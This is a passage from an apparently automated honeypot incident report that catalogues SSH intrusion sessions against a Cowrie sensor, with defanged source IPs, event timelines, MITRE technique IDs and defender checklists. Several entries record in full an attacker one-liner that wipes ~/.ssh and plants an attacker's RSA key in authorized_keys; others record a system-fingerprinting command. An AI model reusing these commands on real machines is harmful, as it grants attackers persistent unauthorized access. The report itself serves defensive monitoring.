| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:01:27` | `cowrie.session.connect` |
| `2026-08-29 12:01:27` | `cowrie.client.version` |
| `2026-08-29 12:01:28` | `cowrie.client.kex` |
| `2026-08-29 12:01:28` | `cowrie.login.success` |
| `2026-08-29 12:01:29` | `cowrie.session.params` |
| `2026-08-29 12:01:29` | `cowrie.command.input` |
| `2026-08-29 12:01:29` | `cowrie.command.failed` |
| `2026-08-29 12:01:29` | `cowrie.log.closed` |
| `2026-08-29 12:01:30` | `cowrie.session.params` |
| `2026-08-29 12:01:30` | `cowrie.command.input` |
| `2026-08-29 12:01:30` | `cowrie.session.file_download` |
| `2026-08-29 12:01:30` | `cowrie.log.closed` |
| `2026-08-29 12:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.235[.]107` to AbuseIPDB if not already reported
- [ ] Block `135.125.235[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27addb4a927

| Field | Detail |
|---|---|
| **Source IP** | `135.125.235[.]107` |
| **First Seen** | 2026-08-29 12:01 |
| **Last Seen** | 2026-08-29 12:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:01:30` | `cowrie.session.connect` |
| `2026-08-29 12:01:30` | `cowrie.client.version` |
| `2026-08-29 12:01:30` | `cowrie.client.kex` |
| `2026-08-29 12:01:30` | `cowrie.login.success` |
| `2026-08-29 12:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.235[.]107` to AbuseIPDB if not already reported
- [ ] Block `135.125.235[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f32c00d90c7

| Field | Detail |
|---|---|
| **Source IP** | `135.125.235[.]107` |
| **First Seen** | 2026-08-29 12:01 |
| **Last Seen** | 2026-08-29 12:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:01:31` | `cowrie.session.connect` |
| `2026-08-29 12:01:31` | `cowrie.client.version` |
| `2026-08-29 12:01:31` | `cowrie.client.kex` |
| `2026-08-29 12:01:31` | `cowrie.login.success` |
| `2026-08-29 12:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.235[.]107` to AbuseIPDB if not already reported
- [ ] Block `135.125.235[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9a2d79c4b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:03 |
| **Last Seen** | 2026-08-29 12:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:03:56` | `cowrie.session.connect` |
| `2026-08-29 12:03:57` | `cowrie.client.version` |
| `2026-08-29 12:03:57` | `cowrie.client.kex` |
| `2026-08-29 12:03:59` | `cowrie.login.success` |
| `2026-08-29 12:03:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:03:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:03:59` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17af3c75e1d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:04 |
| **Last Seen** | 2026-08-29 12:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:04:17` | `cowrie.session.connect` |
| `2026-08-29 12:04:17` | `cowrie.client.version` |
| `2026-08-29 12:04:17` | `cowrie.client.kex` |
| `2026-08-29 12:04:19` | `cowrie.login.success` |
| `2026-08-29 12:04:21` | `cowrie.session.params` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.success` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.command.input` |
| `2026-08-29 12:04:21` | `cowrie.log.closed` |
| `2026-08-29 12:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722eb2139b6a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:06 |
| **Last Seen** | 2026-08-29 12:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:06:05` | `cowrie.session.connect` |
| `2026-08-29 12:06:05` | `cowrie.client.version` |
| `2026-08-29 12:06:05` | `cowrie.client.kex` |
| `2026-08-29 12:06:07` | `cowrie.login.success` |
| `2026-08-29 12:06:08` | `cowrie.session.params` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.success` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:08` | `cowrie.command.input` |
| `2026-08-29 12:06:09` | `cowrie.log.closed` |
| `2026-08-29 12:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dafce369142

| Field | Detail |
|---|---|
| **Source IP** | `103.180.88[.]203` |
| **First Seen** | 2026-08-29 12:06 |
| **Last Seen** | 2026-08-29 12:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:06:19` | `cowrie.session.connect` |
| `2026-08-29 12:06:20` | `cowrie.client.version` |
| `2026-08-29 12:06:20` | `cowrie.client.kex` |
| `2026-08-29 12:06:23` | `cowrie.login.success` |
| `2026-08-29 12:06:23` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.88[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.180.88[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33007030cb12

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:07 |
| **Last Seen** | 2026-08-29 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:07:49` | `cowrie.session.connect` |
| `2026-08-29 12:07:49` | `cowrie.client.version` |
| `2026-08-29 12:07:49` | `cowrie.client.kex` |
| `2026-08-29 12:07:51` | `cowrie.login.success` |
| `2026-08-29 12:07:52` | `cowrie.session.params` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.success` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:52` | `cowrie.command.input` |
| `2026-08-29 12:07:53` | `cowrie.log.closed` |
| `2026-08-29 12:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d054cfd3a3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:09 |
| **Last Seen** | 2026-08-29 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:09:42` | `cowrie.session.connect` |
| `2026-08-29 12:09:42` | `cowrie.client.version` |
| `2026-08-29 12:09:42` | `cowrie.client.kex` |
| `2026-08-29 12:09:44` | `cowrie.login.success` |
| `2026-08-29 12:09:46` | `cowrie.session.params` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.success` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.command.input` |
| `2026-08-29 12:09:46` | `cowrie.log.closed` |
| `2026-08-29 12:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325945043c65

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-29 12:10 |
| **Last Seen** | 2026-08-29 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:10:11` | `cowrie.session.connect` |
| `2026-08-29 12:10:11` | `cowrie.client.version` |
| `2026-08-29 12:10:11` | `cowrie.client.kex` |
| `2026-08-29 12:10:11` | `cowrie.login.success` |
| `2026-08-29 12:10:12` | `cowrie.session.params` |
| `2026-08-29 12:10:12` | `cowrie.command.input` |
| `2026-08-29 12:10:12` | `cowrie.command.failed` |
| `2026-08-29 12:10:12` | `cowrie.log.closed` |
| `2026-08-29 12:10:13` | `cowrie.session.params` |
| `2026-08-29 12:10:13` | `cowrie.command.input` |
| `2026-08-29 12:10:13` | `cowrie.session.file_download` |
| `2026-08-29 12:10:13` | `cowrie.log.closed` |
| `2026-08-29 12:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f61dd6530dcf

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-29 12:10 |
| **Last Seen** | 2026-08-29 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:10:13` | `cowrie.session.connect` |
| `2026-08-29 12:10:13` | `cowrie.client.version` |
| `2026-08-29 12:10:13` | `cowrie.client.kex` |
| `2026-08-29 12:10:14` | `cowrie.login.success` |
| `2026-08-29 12:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a0a3a40881

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-29 12:10 |
| **Last Seen** | 2026-08-29 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:10:14` | `cowrie.session.connect` |
| `2026-08-29 12:10:14` | `cowrie.client.version` |
| `2026-08-29 12:10:14` | `cowrie.client.kex` |
| `2026-08-29 12:10:14` | `cowrie.login.success` |
| `2026-08-29 12:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca59dbf4bf0d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:11 |
| **Last Seen** | 2026-08-29 12:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:11:31` | `cowrie.session.connect` |
| `2026-08-29 12:11:31` | `cowrie.client.version` |
| `2026-08-29 12:11:31` | `cowrie.client.kex` |
| `2026-08-29 12:11:34` | `cowrie.login.success` |
| `2026-08-29 12:11:35` | `cowrie.session.params` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.success` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:35` | `cowrie.command.input` |
| `2026-08-29 12:11:36` | `cowrie.log.closed` |
| `2026-08-29 12:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5714f26877e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:12 |
| **Last Seen** | 2026-08-29 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:12:24` | `cowrie.session.connect` |
| `2026-08-29 12:12:24` | `cowrie.client.version` |
| `2026-08-29 12:12:24` | `cowrie.client.kex` |
| `2026-08-29 12:12:25` | `cowrie.login.success` |
| `2026-08-29 12:12:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:12:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:12:25` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde464f3eaea

| Field | Detail |
|---|---|
| **Source IP** | `185.183.120[.]48` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:01` | `cowrie.session.connect` |
| `2026-08-29 12:13:01` | `cowrie.client.version` |
| `2026-08-29 12:13:01` | `cowrie.client.kex` |
| `2026-08-29 12:13:01` | `cowrie.login.success` |
| `2026-08-29 12:13:02` | `cowrie.session.params` |
| `2026-08-29 12:13:02` | `cowrie.command.input` |
| `2026-08-29 12:13:02` | `cowrie.command.failed` |
| `2026-08-29 12:13:03` | `cowrie.log.closed` |
| `2026-08-29 12:13:03` | `cowrie.session.params` |
| `2026-08-29 12:13:03` | `cowrie.command.input` |
| `2026-08-29 12:13:03` | `cowrie.session.file_download` |
| `2026-08-29 12:13:03` | `cowrie.log.closed` |
| `2026-08-29 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.183.120[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.183.120[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab011b18b811

| Field | Detail |
|---|---|
| **Source IP** | `185.183.120[.]48` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:04` | `cowrie.session.connect` |
| `2026-08-29 12:13:04` | `cowrie.client.version` |
| `2026-08-29 12:13:04` | `cowrie.client.kex` |
| `2026-08-29 12:13:04` | `cowrie.login.success` |
| `2026-08-29 12:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.183.120[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.183.120[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c130773895

| Field | Detail |
|---|---|
| **Source IP** | `185.183.120[.]48` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:04` | `cowrie.session.connect` |
| `2026-08-29 12:13:04` | `cowrie.client.version` |
| `2026-08-29 12:13:05` | `cowrie.client.kex` |
| `2026-08-29 12:13:05` | `cowrie.login.success` |
| `2026-08-29 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.183.120[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.183.120[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507ab0eb620f

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
